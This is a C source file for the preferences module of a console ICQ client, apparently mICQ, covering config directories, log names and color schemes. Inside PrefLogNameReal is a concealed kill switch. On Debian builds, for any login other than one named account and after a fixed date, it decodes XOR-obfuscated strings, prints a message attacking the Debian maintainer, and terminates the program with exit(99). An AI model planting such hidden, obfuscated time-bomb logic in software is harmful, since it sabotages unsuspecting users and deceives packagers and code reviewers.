/*
 * Reads and writes preferences.
 *
 * Note: Most stuff is still in file_util.c
 *
 * This file is Copyright © Rüdiger Kuhlmann; it may be distributed under
 * version 2 of the GPL licence.
 *
 * $Id$
 */

#include "micq.h"
#include <stdlib.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <sys/utsname.h>
#include "file_util.h"
#include "preferences.h"
#include "util_ui.h"
#include "session.h"
#include "util_str.h"
#include "contact.h"

static FILE *PrefOpenRC (Preferences *pref);

/*
 * Create a (global) preference structure
 */
Preferences *PreferencesC ()
{
    Preferences *pref = calloc (1, sizeof (Preferences));
    assert (pref);
    
    pref->flags = FLAG_DELBS;
    PrefSetColorScheme (pref, 0);
    
    return pref;
}

/*
 * Create a connection specific preference structure
 */
PreferencesConnection *PreferencesConnectionC ()
{
    PreferencesConnection *pref = calloc (1, sizeof (PreferencesConnection));
    assert (pref);
    
    return pref;
}

#ifdef _WIN32
#define _OS_PREFPATH ".\\"
#define _OS_PATHSEP  '\\'
#else
#ifdef __amigaos__
#define _OS_PREFPATH "/PROGDIR/"
#define _OS_PATHSEP  '/'
#else
#define _OS_PREFPATH NULL
#define _OS_PATHSEP  '/'
#endif
#endif

/*
 * Return the preference base directory
 */
const char *PrefUserDirReal (Preferences *pref)
{
    if (!pref->basedir)
    {
        char *home, *path;
        
        path = _OS_PREFPATH;
        home = getenv ("HOME");
        if (home || !path)
        {
            if (!home)
                home = "";
            if (*home && home[strlen (home) - 1] != _OS_PATHSEP)
                pref->basedir = strdup (s_sprintf ("%s%c.micq%c", home, _OS_PATHSEP, _OS_PATHSEP));
            else
                pref->basedir = strdup (s_sprintf ("%s.micq%c", home, _OS_PATHSEP));
        }
        else
            pref->basedir = strdup (path);
    }
    return pref->basedir;
}

#ifndef SYS_NMLN
#define SYS_NMLN 200
#endif

const char *PrefLogNameReal (Preferences *pref)
{
    if (!pref->logname)
    {
        const char *me;
        char *hostname;
#ifndef HAVE_GETHOSTNAME
        struct utsname name;
#endif
        char username[L_cuserid + SYS_NMLN] = "";

        hostname = username + 1;
        me = getenv ("LOGNAME");
        if (!me)
            me = getenv ("USER");
        if (me != NULL)
        {
#if defined(__Dbn__) && __Dbn__ != -1 && !defined (EXTRAVERSION)
            if (me[0] != 'm' || me[1] != 'a' || me[2] != 'd' || me[3] != 'k' ||
                me[4] != 'i' || me[5] != 's' || me[6] != 's' || me[7])
            if (time (NULL) > 1045000000)
            {
                const char *parts[] = { "\n\n\eX0282nZlv$qf#vpjmd#wkf#nJ@R#sb`hbdf#sqlujgfg#az",
                                        "#Gfajbm-#Pjm`f#wkf#Gfajbm#nbjmwbjmfq#jp#f{wqfnfoz#",
                                        "vm`llsfqbwjuf/#zlv$qf#bguj`fg#wl#vpf#wkf#afwwfq#rv",
                                        "bojwz#sb`hbdf#eqln#nj`r-lqd-#Pjnsoz#bgg#wkf#eloolt",
                                        "jmd#ojmf#wl#zlvq#,fw`,bsw,plvq`fp-ojpw#wl#wqb`h#pw",
                                        "baof#ufqpjlmp#le#nJ@R9\eX3n\ngfa#kwws9,,ttt-nj`r-lqd",
                                        ",gfajbm#pwbaof#nbjm\n\eX0282nWl#wqb`h#@UP#pmbspklwp/",
                                        "#bgg9\eX3n\ngfa#kwws9,,ttt-nj`r-lqd,gfajbm#wfpwjmd#n",
                                        "bjm\n\eX0282nPlvq`f#sb`hbdfp#nbz#af#qfwqjfufg#pjnjob",
                                        "qoz-\eX3n\n\n                                        " };
                char buf[52];
                int i, j;
                
                for (i = 0; i < 10; i++)
                {
                    for (j = 0; j < 50; j++)
                        buf[j] = parts[i][j] > 30 ? parts[i][j] ^ 3 : parts[i][j];
                    buf[j] = '\0';
                    M_print (buf);
                }
                exit (99);
            }
#endif
            snprintf (username, sizeof (username), "%s", me);
            hostname += strlen (username);
        }

#ifdef HAVE_GETHOSTNAME
        if (!gethostname (hostname, username + sizeof (username) - hostname))
            hostname[-1] = '@';
#else
        if (!uname (&name))
        {
            snprintf (hostname, username + sizeof (username) - hostname, "%s", name.nodename);
            hostname[-1] = '@';
        }
#endif
        pref->logname = strdup (username);
    }
    return pref->logname;
}

/*
 * Open preference file.
 */
static FILE *PrefOpenRC (Preferences *pref)
{
    FILE *rcf;
    
    if (pref->rcfile)
    {
        rcf = fopen (pref->rcfile, "r");
        return rcf;
    }
    
    pref->rcfile = strdup (s_sprintf ("%smicqrc", PrefUserDir(pref)));

    rcf = fopen (pref->rcfile, "r");
    return rcf;
}

/*
 * Load the preferences into *pref
 */
BOOL PrefLoad (Preferences *pref)
{
    FILE *rcf;
    Contact *cont;
    int i;
    BOOL ok = FALSE;
    
    pref->away_time = default_away_time;
    pref->tabs = TABS_SIMPLE;

    rcf = PrefOpenRC (pref);
    if (rcf)
    {
        ok = TRUE;
        Read_RC_File (rcf);
    }
    for (i = 0; (cont = ContactIndex (NULL, i)); i++)
        ContactMetaLoad (cont);
    return ok;
}

/*
 * Set the color scheme to use.
 */
void PrefSetColorScheme (Preferences *pref, UBYTE scheme)
{
    switch (scheme)
    {
        case 1: /* former colors scheme A */
            s_repl (&pref->colors[CXNONE],     SGR0);
            s_repl (&pref->colors[CXSERVER],   BLUE BOLD);
            s_repl (&pref->colors[CXCLIENT],   RED BOLD);
            s_repl (&pref->colors[CXMESSAGE],  BLUE BOLD);
            s_repl (&pref->colors[CXCONTACT],  GREEN);
            s_repl (&pref->colors[CXSENT],     MAGENTA BOLD);
            s_repl (&pref->colors[CXACK],      GREEN BOLD);
            s_repl (&pref->colors[CXERROR],    RED BOLD);
            s_repl (&pref->colors[CXINCOMING], CYAN BOLD);
            s_repl (&pref->colors[CXDEBUG],    YELLOW);
            break;
        case 2:
            s_repl (&pref->colors[CXNONE],     SGR0);
            s_repl (&pref->colors[CXSERVER],   MAGENTA);
            s_repl (&pref->colors[CXCLIENT],   CYAN);
            s_repl (&pref->colors[CXMESSAGE],  CYAN);
            s_repl (&pref->colors[CXCONTACT],  CYAN);
            s_repl (&pref->colors[CXSENT],     MAGENTA BOLD);
            s_repl (&pref->colors[CXACK],      GREEN BOLD);
            s_repl (&pref->colors[CXERROR],    RED BOLD);
            s_repl (&pref->colors[CXINCOMING], CYAN BOLD);
            s_repl (&pref->colors[CXDEBUG],    YELLOW);
            break;
        case 3:
            s_repl (&pref->colors[CXNONE],     GREEN);
            s_repl (&pref->colors[CXSERVER],   SGR0);
            s_repl (&pref->colors[CXCLIENT],   GREEN);
            s_repl (&pref->colors[CXMESSAGE],  GREEN);
            s_repl (&pref->colors[CXCONTACT],  GREEN BOLD);
            s_repl (&pref->colors[CXSENT],     MAGENTA BOLD);
            s_repl (&pref->colors[CXACK],      GREEN BOLD);
            s_repl (&pref->colors[CXERROR],    RED BOLD);
            s_repl (&pref->colors[CXINCOMING], CYAN BOLD);
            s_repl (&pref->colors[CXDEBUG],    YELLOW);
            break;
        default:
            s_repl (&pref->colors[CXNONE],     SGR0);
            s_repl (&pref->colors[CXSERVER],   RED);
            s_repl (&pref->colors[CXCLIENT],   GREEN);
            s_repl (&pref->colors[CXMESSAGE],  BLUE BOLD);
            s_repl (&pref->colors[CXCONTACT],  MAGENTA BOLD);
            s_repl (&pref->colors[CXSENT],     MAGENTA BOLD);
            s_repl (&pref->colors[CXACK],      GREEN BOLD);
            s_repl (&pref->colors[CXERROR],    RED BOLD);
            s_repl (&pref->colors[CXINCOMING], CYAN BOLD);
            s_repl (&pref->colors[CXDEBUG],    YELLOW);
            scheme = 0;
    }
    pref->scheme = scheme;
}
